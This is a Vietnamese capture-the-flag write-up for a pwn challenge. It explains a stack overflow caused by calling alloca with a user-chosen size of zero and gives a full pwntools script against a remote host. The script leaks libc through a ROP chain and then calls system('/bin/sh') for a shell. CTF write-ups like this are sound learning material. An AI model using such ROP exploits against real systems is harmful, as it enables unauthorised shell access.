#### Analyze 

Đề cho cả source để phân tích thì mọi thứ khá là cơ bản, ngoài ra chỉ có NX là được bật còn tất cả mitigation còn lại thì tắt. 

Source thì chẳng có gì đáng để nói nên mình sẽ đi thẳng vào tìm bug và exploit luôn

#### Exploit

Bug nằm ở chỗ `buf = (char*)alloca(atoi(size) + 1);`,hàm `alloca()` rất là nguy hiểm khi sử dụng tại vì giá trị trả về của nó trả về một pointer tại khoảng trống lúc bắt đầu khi alloc, nôm na nó có thể sử dụng để gây ra lỗi buffer overflow. 

Áp dụng vào bài này thì nếu ta nhập `size = 0` thì ta có thể gây ra lỗi buffer overflow, rồi từ đó build ROPchain để leak libc, sau khi có libc thì mọi thứ đơn giản chỉ áp dụng phương pháp trên rồi build ROPchain gọi hàm `system('/bin/sh')` 

Một khởi đầu khá là đơn giản. LoL

```py
from pwn import * 


# r = process('./chall')
r = remote('65.21.255.31',13370)

elf = context.binary = ELF('./chall')
# libc  = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
rdi = 0x0000000000401433
ret = 0x40101a
r.sendlineafter(b'size: ',b'0')
payload = b'a'*72  + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
r.sendlineafter(b'data: ',payload)
# gdb.attach(r,gdbscript = "b * 0x000000000040136e")
leak = u64(r.recv(6).ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']
print(hex(leak))
print(hex(libc.address))
payload_1 = b'a'*72 + p64(ret) + p64(rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendlineafter(b'size: ',b'0')
r.sendlineafter(b'data: ',payload_1)
r.interactive()

# ASIS{06e5ff13b438f5d6626a97758fddde3e502fe3fc}
```

